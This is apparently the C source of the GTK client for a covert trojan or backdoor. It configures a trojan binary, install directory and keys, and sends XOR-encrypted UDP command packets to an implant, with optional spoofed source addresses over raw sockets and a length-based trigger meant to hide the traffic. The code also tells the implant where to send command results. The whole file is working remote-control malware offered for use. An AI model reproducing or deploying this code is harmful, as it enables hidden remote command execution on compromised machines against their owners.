#ifdef HAVE_CONFIG_H
#  include <config.h>
#endif

#include <gtk/gtk.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include "callbacks.h"
#include "interface.h"
#include "support.h"
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

struct udphdr {
         u_int16_t uh_sport;           /* source port */
         u_int16_t uh_dport;           /* destination port */
         u_int16_t uh_ulen;            /* udp length */
         u_int16_t uh_sum;             /* udp checksum */
};

struct iphdr
  {
#if __BYTE_ORDER == __LITTLE_ENDIAN
    unsigned int ihl:4;
    unsigned int version:4;
#elif __BYTE_ORDER == __BIG_ENDIAN
    unsigned int version:4;
    unsigned int ihl:4;
#else
# error "Please fix <bits/endian.h>"
#endif
    u_int8_t tos;
    u_int16_t tot_len;
    u_int16_t id;
    u_int16_t frag_off;
    u_int8_t ttl;
    u_int8_t protocol;
    u_int16_t check;
    u_int32_t saddr;
    u_int32_t daddr;
    /*The options start here. */
  };

int quit=1;
unsigned short port = 0;
unsigned long sip=0, dip=0;
unsigned short sport=0, dport=0;
char *comm="";
char *args;
char plugin_dir[512]="";
char trj_bin[256]="", inst_dir[256]="";
int spoof=0, results=0;
unsigned long spoofhost=0, resultshost=0;
unsigned short spoofport=0, resultsport=0;
int mod=1, rem=0;
char k1[256], k2[256];
unsigned int rsock=-1;

void
on_window_destroy                      (GtkObject       *object,
                                        gpointer         user_data)
{
	quit=0;
}

void
on_exit_activate                       (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	on_window_destroy(NULL, NULL);
}


void
on_clear_buffer_activate               (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	gtk_text_set_point(GTK_TEXT(results_text), 0);
	gtk_text_forward_delete(GTK_TEXT(results_text), gtk_text_get_length(GTK_TEXT(results_text)));
}



void
on_save_buffer_activate                (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	GtkWidget *window;
	window = create_file_select("save buffer");
	gtk_widget_show(window);
}

void
on_server_config_activate              (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	GtkWidget *window;
	window = create_server_config_window();
	gtk_widget_show(window);
}


void
on_client_config_activate              (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	GtkWidget *window;
	window = create_client_config_window();
	gtk_widget_show(window);
}


void
on_ok_button1_clicked                  (GtkButton       *button,
                                        gpointer         user_data)
{
	FILE *fd;
	long i;
	struct in_addr addr;
	char filename[512];
	GtkWidget *widget;
	widget = GTK_WIDGET(button);
	while(widget->parent != NULL)
		widget=widget->parent;
	if(strcmp(GTK_WINDOW(widget)->title, "save buffer") == 0)
	{
		strncpy(filename, gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_select)), sizeof(filename));
		if((fd = fopen(filename, "w")) == NULL)
		{
			g_print("error opening file %s for write access\n", filename);
			return;
		}

		for(i=0;i<gtk_text_get_length(GTK_TEXT(results_text));i++)
			fputc(GTK_TEXT(results_text)->text.ch[i], fd);
		fclose(fd);
	}

	if(strcmp(GTK_WINDOW(widget)->title, "save server config") == 0)
	{
		strncpy(filename, gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_select)), sizeof(filename));
		if((fd = fopen(filename, "w")) == NULL)
		{
			g_print("error opening file %s for write access\n", filename);
			return;
		}
		fprintf(fd, "#define MOD %d\n", mod);
		fprintf(fd, "#define REM %d\n", rem);
		fprintf(fd, "#define KEY1 \"%s\"\n", k1);
		fprintf(fd, "#define KEY2 \"%s\"\n", k2);
		fprintf(fd, "#define TROJAN_BIN \"%s\"\n", trj_bin);
		fprintf(fd, "#define INSTALL_DIR \"%s\"\n", inst_dir);
		fclose(fd);
	}
	if(strcmp(GTK_WINDOW(widget)->title, "save client config") == 0)
	{
		strncpy(filename, gtk_file_selection_get_filename(GTK_FILE_SELECTION(file_select)), sizeof(filename));
		if((fd = fopen(filename, "w")) == NULL)
		{
			g_print("error opening file %s for write access\n", filename);
			return;
		}
		fprintf(fd, "#define SPOOF %d\n", spoof);
		addr.s_addr = spoofhost;
		fprintf(fd, "#define SPOOFHOST \"%s:%d\"\n", inet_ntoa(addr), ntohs(spoofport));
		fprintf(fd, "#define RESULTS %d\n", results);
		addr.s_addr = resultshost;
		fprintf(fd, "#define RESULTSHOST \"%s:%d\"\n", inet_ntoa(addr), ntohs(resultsport));
		fprintf(fd, "#define PLUGIN_DIR \"%s\"\n", plugin_dir);
		fclose(fd);
	}
	on_cancel_button_clicked(button, user_data);
}


void
on_cancel_button1_clicked              (GtkButton       *button,
                                        gpointer         user_data)
{
	on_cancel_button_clicked(button, user_data);
}


void
on_about_activate                      (GtkMenuItem     *menuitem,
                                        gpointer         user_data)
{
	GtkWidget *window;
	window = create_about_window();
	gtk_widget_show(window);
}


void
on_mod_spin_changed                    (GtkEditable     *editable,
                                        gpointer         user_data)
{

}


void
on_save_button_clicked                 (GtkButton       *button,
                                        gpointer         user_data)
{
	GtkWidget *window;
	on_ok_button_clicked(button, user_data);
	window = create_file_select("save server config");
	gtk_widget_show(window);
}


void
on_ok_button_clicked                 (GtkButton       *button,
                                        gpointer         user_data)
{
	mod = gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(mod_spin));
	rem = gtk_spin_button_get_value_as_int(GTK_SPIN_BUTTON(rem_spin));
	strncpy(k1,  gtk_entry_get_text(GTK_ENTRY(key1)), sizeof(k1));
	strncpy(k2, gtk_entry_get_text(GTK_ENTRY(key2)), sizeof(k2));
	strncpy(inst_dir, gtk_entry_get_text(GTK_ENTRY(install_dir)), sizeof(inst_dir));
	strncpy(trj_bin, gtk_entry_get_text(GTK_ENTRY(trojan_bin)), sizeof(trj_bin));
	on_cancel_button_clicked(button, user_data);
}


void
on_cancel_button_clicked               (GtkButton       *button,
                                        gpointer         user_data)
{
	GtkWidget *window;
	window = GTK_WIDGET(button);
	while(window->parent != NULL)
		window=window->parent;
	gtk_widget_destroy(window);
}


void
on_save_client_button_clicked          (GtkButton       *button,
                                        gpointer         user_data)
{
	GtkWidget *window;
	on_ok_client_button_clicked(button, user_data);
	window = create_file_select("save client config");
	gtk_widget_show(window);
}


void
on_ok_client_button_clicked          (GtkButton       *button,
                                        gpointer         user_data)
{
	char tmp[32];
	spoof = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(spoof_option));
	if(spoof)
	{
		strncpy(tmp, gtk_entry_get_text(GTK_ENTRY(spoof_box)), sizeof(tmp));
		switch(ip_port_parse(tmp, &spoofhost, &spoofport))
		{
			case -1:
					write_text("invalid spoof ip address\r\n");
					break;
			case -2:
					write_text("invalid spoof port\r\n");
					break;
			case -3:
					write_text("invalid spoof address: format <ip:port>\r\n");
					break;
			default:
					break;
		}	
	}
	results = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(get_results_button));
	strncpy(tmp, gtk_entry_get_text(GTK_ENTRY(results_box)), sizeof(tmp));
	switch(ip_port_parse(tmp, &resultshost, &resultsport))
	{
		case -1:
				write_text("invalid source ip address\r\n");
				break;
		case -2:
				write_text("invalid source port\r\n");
				break;
		case -3:
				write_text("invalid source address: format <ip:port>\r\n");
				break;
		default:
				break;
	}
	port = 0;
	strncpy(plugin_dir, gtk_entry_get_text(GTK_ENTRY(plugin_dir_box)), sizeof(plugin_dir));
	on_cancel_button_clicked(button, user_data);
}


void
on_cancel_client_button_clicked        (GtkButton       *button,
                                        gpointer         user_data)
{
	on_cancel_button_clicked(button, user_data);
}

void
on_send_button_clicked(GtkButton *button, gpointer user_data)
{
	struct iphdr *iphdr;
	struct udphdr *udphdr;
	struct sockaddr_in addr;
	unsigned int sock; 
	short msglen=7;
	char *send;
	char *enc;
	char tmp[32];
	unsigned long osip;
	unsigned short osport;
	
	osip = sip;
	osport = sport;
	args = (char *) gtk_entry_get_text(GTK_ENTRY(args_box));
	if(comm == NULL || strcmp(comm, "") == 0)
		return;
	if(results)
		msglen += 12;
	strncpy(tmp, gtk_entry_get_text(GTK_ENTRY(server_address_box)), sizeof(tmp));
	switch(ip_port_parse(tmp, &dip, &dport))
	{
		case -1:
					write_text("invalid server address\r\n");
					return;
		case -2:
					write_text("invalid server port\r\n");
					return;
		case -3:
					write_text("invalid server address: format <ip:port>\r\n");
					return;
		default:
					break;
	}
	if(dport == 0)
			dport = htons(rand() % 65535 + 1);
	
	msglen += strlen(k2) + strlen(comm) + strlen(args);
	while((msglen+28)%mod != rem)
		msglen++;
	send = (char *) malloc(msglen);
	if(results)
		snprintf(send, msglen, "%s%1d%8x%4x%4x%s:%s", k2, 1, (unsigned int) resultshost, resultsport, strlen(comm) + strlen(args) + 1, comm, args);
	else
		snprintf(send, msglen, "%s%1d%4x%s:%s", k2, 0, strlen(comm) + strlen(args) + 1, comm, args);
	if(spoof)
	{
		osip = spoofhost;
		if(osip == 0)
			osip = rand();
		osport = spoofport;
	}
	else
	{
		osip = resultshost;
		osport = resultsport;
	}
	if(osport == 0)
		osport = htons(rand() % 65534 + 1);
	if(spoof)
	{
		enc = (char *) malloc(msglen + 28);
		memset(enc, 0, msglen + 28);
		addr.sin_port = dport;
		addr.sin_addr.s_addr = dip;
		addr.sin_family = AF_INET;
		iphdr = (struct iphdr *) enc;
		udphdr = (struct udphdr *) (enc + sizeof(struct iphdr));
		iphdr->ihl = 5;
		iphdr->version = 4;
		iphdr->tos = 0;
		iphdr->tot_len = htons(msglen + 28);
		iphdr->id = 0;
		iphdr->ttl = 255;
		iphdr->protocol = IPPROTO_UDP;
		iphdr->saddr = osip;
		iphdr->daddr = dip;
		udphdr->uh_sport = osport;
		udphdr->uh_dport = dport;
		udphdr->uh_ulen = htons(msglen + 8);
		i_crypt(osip, dip, dport, send, (enc + 28), msglen);
		//udphdr->uh_sum = in_cksum((unsigned short *) udphdr, 8 + msglen);
		iphdr->check = in_cksum((unsigned short *) iphdr, 20);
		sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if(sock == -1)
		{
			write_text("client error: error creating send socket (raw sockets require root access)\r\n");
			return;
		}
		if(sendto(sock, enc, msglen + 28, 0, (struct sockaddr *) &addr, sizeof(addr)) == -1)
			write_text("client error: error sending command packet\r\n");
	}
	else
	{
		enc = (char *) malloc(msglen);
		i_crypt(osip, dip, dport, send, enc, msglen);
		sock = socket(AF_INET, SOCK_DGRAM, 0);
		if(sock == -1)
		{
			write_text("client error: error creating send socket\r\n");
			return;
		}
		addr.sin_port = dport;
		addr.sin_addr.s_addr = dip;
		addr.sin_family = AF_INET;
		if(sendto(sock, enc, msglen, 0, &addr, sizeof(addr)) == -1)
			write_text("client error: error sending command packet\r\n");
	}
	shutdown(sock, 2);
	close(sock);
	free(send);
	free(enc);
}

void on_ctree_highlight(GtkCTree *tree, GtkCTreeNode *node)
{
	gchar *text[3];
	gtk_ctree_get_node_info(tree, node, text, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	comm = (char *) text[0];
}

union longbyte
{
    unsigned long W[80];        /* Process 16 32-bit words at a time */
    char B[320];                /* But read them as bytes for counting */
};

#define f0(x,y,z) (z ^ (x & (y ^ z)))           /* Magic functions */
#define f1(x,y,z) (x ^ y ^ z)
#define f2(x,y,z) ((x & y) | (z & (x | y)))
#define f3(x,y,z) (x ^ y ^ z)

#define K0 0x5a827999                           /* Magic constants */
#define K1 0x6ed9eba1
#define K2 0x8f1bbcdc
#define K3 0xca62c1d6

#define S(n, X) ((X << n) | (X >> (32 - n)))    /* Barrel roll */

#define r0(f, K) \
    temp = S(5, A) + f(B, C, D) + E + *p0++ + K; \
    E = D;  \
    D = C;  \
    C = S(30, B); \
    B = A;  \
    A = temp

#define r1(f, K) \
    temp = S(5, A) + f(B, C, D) + E + \
           (*p0++ = *p1++ ^ *p2++ ^ *p3++ ^ *p4++) + K; \
    E = D;  \
    D = C;  \
    C = S(30, B); \
    B = A;  \
    A = temp

void i_sha(char *mem, unsigned long length, unsigned long *buf)
{
    int i, nread, nbits;
    union longbyte d;
    unsigned long hi_length, lo_length;
    int padded;
    char *s;

    register unsigned long *p0, *p1, *p2, *p3, *p4;
    unsigned long A, B, C, D, E, temp;

    unsigned long h0, h1, h2, h3, h4;

    h0 = 0x67452301;                            /* Accumulators */
    h1 = 0xefcdab89;
    h2 = 0x98badcfe;
    h3 = 0x10325476;
    h4 = 0xc3d2e1f0;

    padded = 0;
    s = mem;
    for (hi_length = lo_length = 0; ;)  /* Process 16 longs at a time */
    {
                if (length < 64) nread = length;
                else             nread = 64;
                length -= nread;
                memcpy(d.B, s, nread);
                s += nread;
        if (nread < 64)   /* Partial block? */
        {
                nbits = nread << 3;               /* Length: bits */
                if ((lo_length += nbits) < nbits)
                        hi_length++;              /* 64-bit integer */

                if (nread < 64 && ! padded)  /* Append a single bit */
                {
                        d.B[nread++] = 0x80; /* Using up next byte */
                        padded = 1;       /* Single bit once */
                }
                for (i = nread; i < 64; i++) /* Pad with nulls */
                        d.B[i] = 0;
                if (nread <= 56)   /* Room for length in this block */
                {
                        d.W[14] = hi_length;
                        d.W[15] = lo_length;
                }
        }
        else    /* Full block -- get efficient */
        {
                if ((lo_length += 512) < 512)
                        hi_length++;    /* 64-bit integer */
        }

        p0 = d.W;
        A = h0; B = h1; C = h2; D = h3; E = h4;

        r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
        r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
        r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
        r0(f0,K0);

        p1 = &d.W[13]; p2 = &d.W[8]; p3 = &d.W[2]; p4 = &d.W[0];

                   r1(f0,K0); r1(f0,K0); r1(f0,K0); r1(f0,K0);
        r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
        r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
        r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
        r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
        r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
        r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
        r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
        r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
        r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
        r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
        r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
        r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);

        h0 += A; h1 += B; h2 += C; h3 += D; h4 += E;

        if (nread <= 56) break; /* If it's greater, length in next block */
    }
    buf[0] = h0; buf[1] = h1; buf[2] = h2; buf[3] = h3; buf[4] = h4;

}

void i_crypt(unsigned long ip1, unsigned long ip2, unsigned short port, unsigned char *src, unsigned char *dst, unsigned long len)
{
	char *in;
	unsigned char *xorkey;
	long i;
	int j;
	in = (char *) malloc(strlen(k1) + 20);
	xorkey = (unsigned char *) malloc(40);
	sprintf(in, "%x%x%4x%s", (unsigned int) ip1, (unsigned int) ip2, (unsigned int) port, k1);
	i_sha(in, strlen(in), (unsigned long *) xorkey);
	for(i=0,j=0;i<len;i++,j+=2)
	{
		if(j>18)
			j=0;
		dst[i] = src[i] ^ xorkey[j];
		dst[i] ^= xorkey[j+1];
	}
	free(xorkey);
	free(in);
}

long i_strtol(char *str, int len, int base)
{
	unsigned long int ret = 0;
	int i;
	for(i=0;i<len;i++)
	{
		if(str[i] >= '0' && str[i] <= '9')
			ret = (ret * base) + (str[i] - '0');
		else if((str[i] >= 'a' && str[i] <= 'f') && base == 16)
			ret = (ret * base) + (str[i] - 'a');
		else return -1;
	}
	return ret;
}

void write_text(char *text)
{
	gtk_text_insert(GTK_TEXT(results_text), NULL, NULL, NULL, text, strlen(text));
	gtk_main_iteration();
}

int ip_port_parse(char *text, unsigned long *ip, unsigned short *port)
{
	struct hostent *he;
	char *tok;
	char tmp[32];
	if(strcmp(text, "") == 0)
			return -3;
	strcpy(tmp, text);
	tok = strtok(tmp, ":");
	he = (struct hostent *) gethostbyname(tok);
	if(he == NULL)
		return -1;
	memcpy(ip, he->h_addr, he->h_length);
	tok = strtok(NULL, ":");
	if(tok == NULL)
		return -3;
	*port = (unsigned short) i_strtol(tok, strlen(tok), 10);
	if(*port == (unsigned short) -1)
		return -2;
	*port = htons(*port);
	return 0;
}

unsigned short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(u_char *) (&answer) = *(u_char *) w;
        sum += answer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

int load_client(char *filename)
{
	FILE *fd;
	char tmp[512];
	char *ptr;

	if((fd = fopen(filename, "r")) == NULL)
	{
		write_text("client error: unable to open client config file\r\n");
		return -1;
	}
	while(!feof(fd))
	{
		if(fgets(tmp, sizeof(tmp), fd) == NULL)
			break;
		ptr = tmp;
		ptr += 8;
		if(tmp[strlen(tmp) - 1] == '\n')
			tmp[strlen(tmp) - 1] = 0;
		
		if(strncmp(ptr, "SPOOF ", 6) == 0)
			spoof = i_strtol(ptr + 6, strlen(ptr + 6), 10);
		if(strncmp(ptr, "SPOOFHOST ", 10) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			ip_port_parse(ptr + 11, &spoofhost, &spoofport);
		}		
		if(strncmp(ptr, "RESULTS ", 8) == 0)
			results = i_strtol(ptr + 8, strlen(ptr + 8), 10);
		if(strncmp(ptr, "RESULTSHOST ", 12) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			ip_port_parse(ptr + 13, &resultshost, &resultsport);
		}
		if(strncmp(ptr, "PLUGIN_DIR ", 11) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			strncpy(plugin_dir, ptr + 12, sizeof(plugin_dir));
		}
	}
	fclose(fd);
	return 0;
}

int load_server(char *filename)
{
	FILE *fd;
	char tmp[512];
	char *ptr;

	if((fd = fopen(filename, "r")) == NULL)
		return -1;
	
	while(!feof(fd))
	{
		if(fgets(tmp, sizeof(tmp), fd) == NULL)
			break;
		ptr = tmp;
		ptr+=8;
		if(tmp[strlen(tmp) - 1] == '\n')
			tmp[strlen(tmp) - 1] = 0;
		
		if(strncmp(ptr, "MOD ", 4) == 0)
			mod = i_strtol(ptr + 4, strlen(ptr + 4), 10);
		if(strncmp(ptr, "REM ", 4) == 0)
			rem = i_strtol(ptr + 4, strlen(ptr + 4), 10);
		if(strncmp(ptr, "KEY1 ", 5) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			strncpy(k1, ptr + 6, sizeof(k1));
		}
		if(strncmp(ptr, "KEY2 ", 5) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			strncpy(k2, ptr + 6, sizeof(k2));
		}
		if(strncmp(ptr, "TROJAN_BIN ", 11) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			strncpy(trj_bin, ptr + 12, sizeof(trj_bin));
		}
		if(strncmp(ptr, "INSTALL_DIR ", 12) == 0)
		{
			tmp[strlen(tmp) - 1] = 0;
			strncpy(inst_dir, ptr + 13, sizeof(inst_dir));
		}
	}
	fclose(fd);
	return 0;
}

